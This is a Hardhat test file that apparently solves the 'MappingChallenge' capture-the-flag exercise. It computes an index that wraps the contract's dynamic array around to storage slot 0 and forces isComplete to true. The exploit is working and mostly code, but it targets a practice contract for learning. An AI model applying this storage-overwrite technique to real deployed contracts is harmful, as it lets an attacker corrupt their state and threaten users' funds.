import { expect } from "chai";
import { ethers } from "hardhat";

describe("MappingChallenge", function () {
  it("should return true if we force the value of isComplete to be 1", async function () {
    const Challenge = await ethers.getContractFactory("MappingChallenge");
    const challenge = await Challenge.deploy();
    await challenge.deployed();

    const slot = ethers.utils.hexZeroPad("0x1", 32);
    const arrayLoc = ethers.utils.keccak256(slot);

    const overflowLoc = ethers.constants.MaxUint256.sub(arrayLoc).add(1);

    const setTx = await challenge.set(overflowLoc, 1);
    await setTx.wait();

    expect(await challenge.isComplete()).to.equal(true);
  });
});
